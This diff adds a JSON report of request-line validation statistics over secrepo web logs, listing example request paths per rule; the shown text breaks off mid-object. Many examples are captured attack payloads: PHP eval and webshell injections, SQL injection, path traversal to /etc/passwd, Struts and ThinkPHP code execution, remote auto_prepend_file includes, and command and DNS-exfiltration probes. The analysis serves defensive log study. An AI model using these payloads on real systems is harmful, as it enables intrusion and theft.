@@ -1,0 +1,1565 @@
+{
+ "source": "secrepo-2017-2023",
+ "format": "clf",
+ "static_site_signatures": true,
+ "files": 2508,
+ "meta": {
+  "file_errors": [],
+  "raw_lines": 3646443,
+  "attack_client_ips": 50638
+ },
+ "request_line_shapes": {
+  "ok": 3646443
+ },
+ "methods": {
+  "GET": 3378475,
+  "HEAD": 208843,
+  "POST": 58587,
+  "OPTIONS": 201,
+  "PUT": 272,
+  "OTHER": 57,
+  "DELETE": 8
+ },
+ "attack_exclusions": {
+  "target_signature": 251966,
+  "scanner_session_ip": 220923,
+  "absolute_or_asterisk_form": 1824,
+  "scanner_user_agent": 6408,
+  "nonstandard_method": 57
+ },
+ "detector_vs_reference_disagreements": {
+  "examples": []
+ },
+ "forbidden_ascii_chars_path": {
+  "']'": 79,
+  "'['": 58,
+  "'|'": 50,
+  "'\"'": 13,
+  "'{'": 9,
+  "'}'": 9,
+  "'`'": 1
+ },
+ "forbidden_ascii_chars_query": {
+  "'['": 5739,
+  "']'": 5739,
+  "'\\\\'": 687,
+  "'{'": 320,
+  "'}'": 311,
+  "'>'": 80,
+  "'<'": 74,
+  "'`'": 50,
+  "'\"'": 48,
+  "'|'": 5,
+  "'^'": 4
+ },
+ "raw": {
+  "lines": 3646443,
+  "unique_targets": 65635,
+  "ref_reject_lines": 145647,
+  "pct_ref_reject": 3.9942,
+  "ref_308_lines": 65722,
+  "pct_ref_308": 1.8024,
+  "clauses": {
+   "p.not_origin_form": {
+    "lines": 1824,
+    "pct_lines": 0.05,
+    "sole_cause_lines": 1780,
+    "pct_sole": 0.0488,
+    "unique_targets": 107,
+    "pct_unique": 0.163,
+    "examples": [
+     "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb",
+     "http://www.secrepo.com/twitter-icon.png",
+     "http://secrepo.com/",
+     "http://www.secrepo.com/",
+     "http://www.secrepo.com/ftp://download.iwlab.foi.se/dataset/",
+     "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf"
+    ]
+   },
+   "p.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.bad_pct": {
+    "lines": 64,
+    "pct_lines": 0.0018,
+    "sole_cause_lines": 61,
+    "pct_sole": 0.0017,
+    "unique_targets": 25,
+    "pct_unique": 0.0381,
+    "examples": [
+     "/self.logs/%s",
+     "/honeypot/Honeypot%20-%2...",
+     "/honeypot/BSidesDFW%20-%...",
+     "/honeypot/Honeypot%20-%20Howto%20-%20BSides%2",
+     "/honeypot/Honeypot%20-%20Howto%20-%",
+     "/honeypot/BSidesDFW%20-%2"
+    ]
+   },
+   "p.enc_slash": {
+    "lines": 27,
+    "pct_lines": 0.0007,
+    "sole_cause_lines": 24,
+    "pct_sole": 0.0007,
+    "unique_targets": 17,
+    "pct_unique": 0.0259,
+    "examples": [
+     "/pe_static%2Fapt1.zip",
+     "/pe_static%2Fzeus.zip",
+     "/assets/%2f",
+     "/maccdc2012%2Fconn.log.gz",
+     "//evil.com/%2F..",
+     "/%22%26%26%20%63%6d%64%20%2f%76%20%2f%63%20%22%77%68%6f%61%6d%69%20%3e%20%62%6c%69%20%26%26%20%63%65%72%74%75%74%69%6c%20%2d%65%6e%63%6f%64%65%20%62%6c%69%20%62"
+    ]
+   },
+   "p.enc_backslash": {
+    "lines": 852,
+    "pct_lines": 0.0234,
+    "sole_cause_lines": 596,
+    "pct_sole": 0.0163,
+    "unique_targets": 497,
+    "pct_unique": 0.7572,
+    "examples": [
+     "/honeypot/%5C%22https://twitter.com/sooshie%5C%22",
+     "/honeypot/%5C%22https://twitter.com/theroxyd%5C%22",
+     "/honeypot/%5C%22http://amunhoney.sourceforge.net/%5C%22",
+     "/honeypot/%5C%22http://glastopf.org/%5C%22",
+     "/honeypot/%5C%22http://www.maxmind.com%5C%22",
+     "/%5C%22http://glastopf.org/%5C%22"
+    ]
+   },
+   "p.enc_semicolon": {
+    "lines": 7,
+    "pct_lines": 0.0002,
+    "sole_cause_lines": 2,
+    "pct_sole": 0.0001,
+    "unique_targets": 5,
+    "pct_unique": 0.0076,
+    "examples": [
+     "/Datasets%2520Description/HTML_Bro_log_1/%3FC%3DD%3BO%3DA",
+     "/%22%3b%70%69%6e%67%20%60%65%63%68%6f%20%61%61%61%61%61%61%61%61%61%61%61%20%7c%20%62%61%73%65%36%34%60%2d%69%6e%6a%65%63%74%2dsecrepo.com%2e%30%31%68%34%78%2e%",
+     "/%22%3b%6e%73%6c%6f%6f%6b%75%70%20%60%77%68%6f%61%6d%69%60%2d%6c%6f%6f%6b%75%70%2dsecrepo.com%2e%30%31%68%34%78%2e%63%6f%6d%3b%22",
+     "/web/20170710084348/https%3A//pixel.quantserve.com/pixel%3Br%3D1950971587%3Brf%3D0%3Ba%3Dp-0cXb7ATGU9nz5%3Burl%3Dhttp%3A//www.secrepo.com/%3Bfpan%3Du%3Bfpa%3D%3",
+     "/web/20170710084348/https%3A//pixel.quantserve.com/pixel%3Br%3D513286151%3Brf%3D0%3Ba%3Dp-0cXb7ATGU9nz5%3Burl%3Dhttp%3A//www.secrepo.com/%3Bfpan%3Du%3Bfpa%3D%3B"
+    ]
+   },
+   "p.enc_nul": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_pct": {
+    "lines": 336,
+    "pct_lines": 0.0092,
+    "sole_cause_lines": 293,
+    "pct_sole": 0.008,
+    "unique_targets": 142,
+    "pct_unique": 0.2163,
+    "examples": [
+     "/honeypot/BSidesDFW%2520-%25202014.ipynb",
+     "/honeypot/Honeypot%2520-%2520Howto.pdf",
+     "/honeypot/Honeypot%252...",
+     "/honeypot/BSidesDFW%2520-%25202014.ipynb'",
+     "/honeypot/Honeypot%2520-%2520Howto%2520-%2520BSides%2520Austin.pdf",
+     "/honeypot/BSidesDFW%2520-%25202014.ipynb'A=0"
+    ]
+   },
+   "p.enc_ctrl": {
+    "lines": 333,
+    "pct_lines": 0.0091,
+    "sole_cause_lines": 21,
+    "pct_sole": 0.0006,
+    "unique_targets": 312,
+    "pct_unique": 0.4754,
+    "examples": [
+     "/%0D/wp-includes/js/jquery/jquery.js",
+     "/%0D/wp-login.php",
+     "/%0D/language/en-GB/en-GB.xml",
+     "/%0D/forum/register.php",
+     "/%0D/administrator/",
+     "/%0D/joomla/"
+    ]
+   },
+   "p.enc_nonascii": {
+    "lines": 2269,
+    "pct_lines": 0.0622,
+    "sole_cause_lines": 2063,
+    "pct_sole": 0.0566,
+    "unique_targets": 270,
+    "pct_unique": 0.4114,
+    "examples": [
+     "/%C2%A0%C2%A0",
+     "/%C3%82%C2%A0%C3%82",
+     "/%20%E5%90%84%E7%A7%8D%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%AC%E7%BD%91%E7%AB%99%EF%BC%8C%E6%AF%94%E8%BE%83%E9%80%82%E5%90%88%E7%BB%83%E4%B9%A0%E6",
+     "/3.%E8%BF%99%E4%B8%AA%E6%98%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E9%A1%B6%E7%BA%A7%E4%BC%9A%E8%AE%AECCS%E4%B8%93%E9%97%A8%E9%92%88%E5%AF%B9%E4%BA%BA%E5%B7%A5%",
+     "/%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%B0%B1%E6%98%AF%E4%B8%AD%E5%A4%A7%E8%A5%BF%E6%B4%8B2012%E5%B9%B4%E6%AF%94%E8%B5%9B%E7%9A%84%E6%95%B0%E6%8D%AE",
+     "/modules/%C2%ADsimpleslideshow/%C2%ADuploadimage.php"
+    ]
+   },
+   "p.raw_nonascii": {
+    "lines": 421,
+    "pct_lines": 0.0115,
+    "sole_cause_lines": 421,
+    "pct_sole": 0.0115,
+    "unique_targets": 112,
+    "pct_unique": 0.1706,
+    "examples": [
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.zip",
+     "/\\xd0\\xc2\\xd4\\xf6\\xd9Y\\xc1\\xcf\\x8aA.rar",
+     "/\\xd0\\xc2\\xd4\\xf6\\xd9Y\\xc1\\xcf\\x8aA.zip",
+     "/\\xd0\\xc2\\xd4\\xf6\\xd9Y\\xc1\\xcf\\x8aA.7z",
+     "/\\xd4\\xb4\\xc2\\xeb.zip",
+     "/\\xb3\\xcc\\xd0\\xf2.tar.gz"
+    ]
+   },
+   "p.backslash": {
+    "lines": 4,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 4,
+    "pct_sole": 0.0001,
+    "unique_targets": 1,
+    "pct_unique": 0.0015,
+    "examples": [
+     "/self.logs\\\\access.log.2017-06-07.gz"
+    ]
+   },
+   "p.semicolon": {
+    "lines": 1247,
+    "pct_lines": 0.0342,
+    "sole_cause_lines": 718,
+    "pct_sole": 0.0197,
+    "unique_targets": 291,
+    "pct_unique": 0.4434,
+    "examples": [
+     "/maccdc2012/ssh.log.gzl;",
+     "/maccdc2012/ssl.log.gz;",
+     "/auth.log/auth.log.gz;",
+     "/maccdc2012/ssh.log.gz;",
+     "/g;m.parentNode.insertBefore(a,m)",
+     "/Discuz.Web/UploadFiles/ali.asp;ali"
+    ]
+   },
+   "p.space": {
+    "lines": 1881,
+    "pct_lines": 0.0516,
+    "sole_cause_lines": 1879,
+    "pct_sole": 0.0515,
+    "unique_targets": 747,
+    "pct_unique": 1.1381,
+    "examples": [
+     "/honeypot/Honeypot - Howto.pdf",
+     "/honeypot/BSidesDFW - 2014.ipynb",
+     "/honeypot/Honeypot - Howto - BSides Austin.pdf",
+     "/honeypot/Honeypot - Howto.pdf?'\\xc2\\xb4%270x27;",
+     "/ ",
+     "/honeypot/BSidesDFW - 2014.ipynb?'\\xc2\\xb4%270x27;"
+    ]
+   },
+   "p.fragment": {
+    "lines": 179,
+    "pct_lines": 0.0049,
+    "sole_cause_lines": 179,
+    "pct_sole": 0.0049,
+    "unique_targets": 32,
+    "pct_unique": 0.0488,
+    "examples": [
+     "/#",
+     "/#other",
+     "/#malware",
+     "/#system",
+     "/#network",
+     "/data#"
+    ]
+   },
+   "p.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.other_forbidden_ascii": {
+    "lines": 177,
+    "pct_lines": 0.0049,
+    "sole_cause_lines": 97,
+    "pct_sole": 0.0027,
+    "unique_targets": 111,
+    "pct_unique": 0.1691,
+    "examples": [
+     "/{{imgSrc}}",
+     "/+csv.iloc[0][path]",
+     "/+csv.iloc[0][path]?test=%2500",
+     "/index.php/module/aciton/param1/{${eval($_POST[s])}}",
+     "/index.php/index/index/name/{${eval($_POST[s])}}",
+     "/|"
+    ]
+   },
+   "p.dot_segment": {
+    "lines": 34,
+    "pct_lines": 0.0009,
+    "sole_cause_lines": 27,
+    "pct_sole": 0.0007,
+    "unique_targets": 17,
+    "pct_unique": 0.0259,
+    "examples": [
+     "/self.logs/.",
+     "/+CSCOU+/../+CSCOE+/files/file_list.json",
+     "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/hosts",
+     "//vulnweb.com/%2e%2e",
+     "////vulnweb.com/%2e%2e",
+     "/../../../../../../../../../../../../etc/passwd"
+    ]
+   },
+   "p.empty_segment": {
+    "lines": 66572,
+    "pct_lines": 1.8257,
+    "sole_cause_lines": 62448,
+    "pct_sole": 1.7126,
+    "unique_targets": 6338,
+    "pct_unique": 9.6564,
+    "examples": [
+     "/honeypot//%22http://amunhoney.sourceforge.net//%22",
+     "/honeypot//%22http://glastopf.org//%22",
+     "/honeypot//%22http://www.maxmind.com/%22",
+     "/honeypot//%22https://twitter.com/sooshie/%22",
+     "/honeypot//%22https://twitter.com/theroxyd/%22",
+     "//wp-includes/registration-functions.php"
+    ]
+   },
+   "p.trailing_slash_308": {
+    "lines": 128389,
+    "pct_lines": 3.5209,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 19481,
+    "pct_unique": 29.6808,
+    "examples": [
+     "/self.logs/",
+     "/self.logs/?C=S%3BO%3DA",
+     "/self.logs/?C=D%3BO%3DA",
+     "/rss/",
+     "/self.logs/?C=M;O=A",
+     "/index.php/feed/"
+    ]
+   },
+   "q.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.empty_pair": {
+    "lines": 178,
+    "pct_lines": 0.0049,
+    "sole_cause_lines": 15,
+    "pct_sole": 0.0004,
+    "unique_targets": 17,
+    "pct_unique": 0.0259,
+    "examples": [
+     "/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download",
+     "//plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114",
+     "/?&r=1",
+     "/plus/recommend.php?&aid=1&_FILES[type][tmp_name]=%5C%27%20%20or%20mid=@%60%5C%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20%20CONCAT%280x7c,userid,",
+     "/plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&",
+     "/?utm_source=qq&utm_medium=social&utm_oi=1009210425644339200&"
+    ]
+   },
+   "q.no_eq": {
+    "lines": 3330,
+    "pct_lines": 0.0913,
+    "sole_cause_lines": 1394,
+    "pct_sole": 0.0382,
+    "unique_targets": 420,
+    "pct_unique": 0.6399,
+    "examples": [
+     "/xmlrpc.php?rsd",
+     "/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.intecs.ru/sites/default/files/languages/30.txt",
+     "/honeypot/Honeypot - Howto.pdf?'\\xc2\\xb4%270x27;",
+     "/?index",
+     "/robots.txt?1494768654881",
+     "/robots.txt?1494768654880"
+    ]
+   },
+   "q.multi_eq": {
+    "lines": 60721,
+    "pct_lines": 1.6652,
+    "sole_cause_lines": 309,
+    "pct_sole": 0.0085,
+    "unique_targets": 18524,
+    "pct_unique": 28.2227,
+    "examples": [
+     "/self.logs/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=S;O=D",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/?C=D;O=A",
+     "/self.logs/?C=D;O=D"
+    ]
+   },
+   "q.empty_name": {
+    "lines": 4,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 1,
+    "pct_unique": 0.0015,
+    "examples": [
+     "/?=foo%22%3E%3Cscript+src%3D%2F%2Fxss.mx%3E%3C%2Fscript%3E%3Cx%3D%22"
+    ]
+   },
+   "q.bad_pct": {
+    "lines": 3,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 1,
+    "pct_unique": 0.0015,
+    "examples": [
+     "/struts2-showcase/filedownload/index.action?method:%23_memberAccess%[url=mailto:3d@ognl.OgnlContext]3d@ognl.OgnlContext[/url]@DEFAULT_MEMBER_ACCESS,%23a%3d%23pa"
+    ]
+   },
+   "q.enc_amp_eq": {
+    "lines": 4524,
+    "pct_lines": 0.1241,
+    "sole_cause_lines": 15,
+    "pct_sole": 0.0004,
+    "unique_targets": 354,
+    "pct_unique": 0.5393,
+    "examples": [
+     "/self.logs/?C=S%3BO%3DA",
+     "/self.logs/?C=D%3BO%3DA",
+     "/self.logs/?C=N%3BO%3DD",
+     "/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.intecs.ru/sites/default/files/languages/30.txt",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=352,r=,rl=0",
+     "/?redirect:$%7B%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.setContentType('text/plain'),%23matt.getWriter().pr"
+    ]
+   },
+   "q.enc_semicolon": {
+    "lines": 4414,
+    "pct_lines": 0.121,
+    "sole_cause_lines": 13,
+    "pct_sole": 0.0004,
+    "unique_targets": 224,
+    "pct_unique": 0.3413,
+    "examples": [
+     "/self.logs/?C=S%3BO%3DA",
+     "/self.logs/?C=D%3BO%3DA",
+     "/self.logs/?C=N%3BO%3DD",
+     "/misc/?User-Agent=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.0.3%3B+zh-cn%3B+M032+Build%2FIML74K%29+UC+AppleWebKit%2F534.31+%28KHTML%2C+like+Gecko%29+Mobile+Safar",
+     "/self.logs/?C=M%3BO%3DA",
+     "/self.logs/2015/?C=D%3BO%3DA"
+    ]
+   },
+   "q.enc_plus": {
+    "lines": 293,
+    "pct_lines": 0.008,
+    "sole_cause_lines": 28,
+    "pct_sole": 0.0008,
+    "unique_targets": 99,
+    "pct_unique": 0.1508,
+    "examples": [
+     "/?nsukey=N9rkTszqr%2F1tL9xXJtucbm0%2FuT9udcM79cxMqBXX9NEp46Xr0fokcc96z24thuLvOT%2BBB%2B%2BOlYRUZ4A1qYP79NpCb6ivw1kJrc%2Fmfg4aXRsGrTRxAM3FaQ%2FJ92PLSup4uQ6tMUvHO",
+     "/?nsukey=T4VlJC1T112zATF0Ida%2Baoa3ZY9JkbzuURpniJ%2BYKOZV3lpl1MOJHzQ1XRpB27jgv2yynHJ4bu4pUQZ%2FGzjFGRIRdIzodJ9noNodZaV8v5%2BuxPG7ZKfmlTaZctarrfiIrn8JM%2BuoYSt3Z",
+     "/?nsukey=6i8eWeLEitp55aigrCwsv2Ogl3s%2B6NxXvFWX40lyPjfTAmEeXOFx8BCVF%2FbCsftIffSR5cOcf6dnusBSL5C1tcq41qSpT16LAm6BA5Z3SuSd3bVA%2FSAbNXe6t09VafYt%2FKSLWn%2FTp83dV",
+     "/?nsukey=H5EHZpfbE2ZUUh03wgz6zCYKT340kuCcRe4oZXpjF9ykc7TB%2BhaqZy2yBVGS1%2FWVVqQ49f2s%2FIFYDuij6YRw4lzpnccRRAbyAv0coQWZHj3SZP1voXPscTcOxKgJIiY8g2DrSUuU4Gs16p%2B",
+     "/?nsukey=MtYDbs26NUV%2FYQBfb8AAJ54eWcasaP89twBDILnjDBculyH6p%2FH6xnhHhVFHOtObCbcrlvhuMwofD32oIUvbQtffh99MqRM%2FX2G9BJrKHoj%2BR0BiE7v9y3wcusfoWtMswYPFnGgl8i7vng8",
+     "//NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%"
+    ]
+   },
+   "q.enc_pct": {
+    "lines": 132,
+    "pct_lines": 0.0036,
+    "sole_cause_lines": 16,
+    "pct_sole": 0.0004,
+    "unique_targets": 63,
+    "pct_unique": 0.096,
+    "examples": [
+     "/+csv.iloc[0][path]?test=%2500",
+     "/struggle.php?s=%252F%252F%255Cthink%255Capp%252Finvokefunction&function=call_user_func_array&vars%5B1%5D%5B%5D=%253C%253Fphp%2B%2540eval%2528base64_decode%2528",
+     "/public/struggle.php?s=%252F%252F%255Cthink%255Capp%252Finvokefunction&function=call_user_func_array&vars%5B1%5D%5B%5D=%253C%253Fphp%2B%2540eval%2528base64_deco",
+     "/struggle.php?s=%252Fhome%252F%255Cthink%255Capp%252Finvokefunction&function=call_user_func_array&vars%5B1%5D%5B%5D=%253C%253Fphp%2B%2540eval%2528base64_decode%",
+     "/public/struggle.php?s=%252Fhome%252F%255Cthink%255Capp%252Finvokefunction&function=call_user_func_array&vars%5B1%5D%5B%5D=%253C%253Fphp%2B%2540eval%2528base64_",
+     "/struggle.php?s=%252Fadmin%252F%255Cthink%255Capp%252Finvokefunction&function=call_user_func_array&vars%5B1%5D%5B%5D=%253C%253Fphp%2B%2540eval%2528base64_decode"
+    ]
+   },
+   "q.enc_nul_ctrl": {
+    "lines": 274,
+    "pct_lines": 0.0075,
+    "sole_cause_lines": 32,
+    "pct_sole": 0.0009,
+    "unique_targets": 159,
+    "pct_unique": 0.2422,
+    "examples": [
+     "/misc/?User-Agent=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.0.3%3B+zh-cn%3B+M032+Build%2FIML74K%29+UC+AppleWebKit%2F534.31+%28KHTML%2C+like+Gecko%29+Mobile+Safar",
+     "//change_lan.php?LanID=../../../../../../../../../etc/passwd%00",
+     "//fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=Media&CurrentFolder=%2FHzllaga_Getshell.php%00.gif",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=198,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=222,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=164,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%"
+    ]
+   },
+   "q.enc_nonascii": {
+    "lines": 159,
+    "pct_lines": 0.0044,
+    "sole_cause_lines": 31,
+    "pct_sole": 0.0009,
+    "unique_targets": 69,
+    "pct_unique": 0.1051,
+    "examples": [
+     "/plus/ajax_officebuilding.php?act=alphabet&x=11%d5'%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,concat(0x3C623E5E5F5E203C2F623E,admin_name,0x3A,pwd,0x3C",
+     "//static/image/admincp/admincp.css?discuz%E8%AF%86%E5%88%ABcms",
+     "//static/image/admincp/admincp.css%20/.php?discuz%E8%AF%86%E5%88%ABcms",
+     "/admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\\xe2\\x80\\x9d,%201,%20\\xe2\\x80\\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%",
+     "//admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\\xe2\\x80\\x9d,%201,%20\\xe2\\x80\\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1",
+     "/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode"
+    ]
+   },
+   "q.plus": {
+    "lines": 899,
+    "pct_lines": 0.0247,
+    "sole_cause_lines": 277,
+    "pct_sole": 0.0076,
+    "unique_targets": 143,
+    "pct_unique": 0.2179,
+    "examples": [
+     "/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.intecs.ru/sites/default/files/languages/30.txt",
+     "//plus/recommend.php?action=&aid=1&_FILES%5Btype%5D%5Btmp_name%5D=%5C%27%20or%20mid=@%60%5C%27%60%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,u",
+     "/misc/?User-Agent=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.0.3%3B+zh-cn%3B+M032+Build%2FIML74K%29+UC+AppleWebKit%2F534.31+%28KHTML%2C+like+Gecko%29+Mobile+Safar",
+     "/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://blog.perujo.es//wp-content/plugins/r.txt",
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&iid=dee6e0155a3649fb944f3edea7220ae6&uid=84117791&nid=244+285282312",
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&iid=a6d6b916119e4cb4a3863436a80b5e6e&uid=91555709&nid=244+272699400"
+    ]
+   },
+   "q.semicolon": {
+    "lines": 61994,
+    "pct_lines": 1.7001,
+    "sole_cause_lines": 1307,
+    "pct_sole": 0.0358,
+    "unique_targets": 19554,
+    "pct_unique": 29.792,
+    "examples": [
+     "/self.logs/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=S;O=D",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/?C=D;O=A",
+     "/self.logs/?C=D;O=D"
+    ]
+   },
+   "q.raw_nonascii": {
+    "lines": 34,
+    "pct_lines": 0.0009,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 5,
+    "pct_unique": 0.0076,
+    "examples": [
+     "/honeypot/Honeypot - Howto.pdf?'\\xc2\\xb4%270x27;",
+     "/honeypot/BSidesDFW - 2014.ipynb?'\\xc2\\xb4%270x27;",
+     "/admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\\xe2\\x80\\x9d,%201,%20\\xe2\\x80\\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%",
+     "//admin_aspcms/_system/AspCms_SiteSetting.asp?action=saves\\xe2\\x80\\x9d,%201,%20\\xe2\\x80\\x9crunMode=1&siteMode=1&siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1",
+     "/plus/ajax_officebuilding.php?act=key&key=\\xe9\\x8c\\xa6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5(205454790),5,6,7,8,9%23"
+    ]
+   },
+   "q.space": {
+    "lines": 1,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 1,
+    "pct_unique": 0.0015,
+    "examples": [
+     "/?s=index/\\\\think\\\\view\\\\driver\\\\Php/display&content=<?php phpinfo();?>"
+    ]
+   },
+   "q.fragment": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.other_forbidden_ascii": {
+    "lines": 3373,
+    "pct_lines": 0.0925,
+    "sole_cause_lines": 582,
+    "pct_sole": 0.016,
+    "unique_targets": 493,
+    "pct_unique": 0.7511,
+    "examples": [
+     "/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}}",
+     "//plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs",
+     "/product.php?pagesize=${@print(eval($_POST[c]))}",
+     "//search.php?searchtype=5&tid=&area=@eval($_POST[c])",
+     "//index.php?s=vod-search-area-${@print(@eval($_POST[c]))}.html",
+     "/index.php?s=my-show-id-1{~phpinfo()}.html"
+    ]
+   },
+   "q.dup_name": {
+    "lines": 2740,
+    "pct_lines": 0.0751,
+    "sole_cause_lines": 618,
+    "pct_sole": 0.0169,
+    "unique_targets": 831,
+    "pct_unique": 1.2661,
+    "examples": [
+     "//plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs",
+     "//plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114",
+     "//plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs",
+     "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1",
+     "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1",
+     "//plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B"
+    ]
+   },
+   "h.userinfo": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ip_literal": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
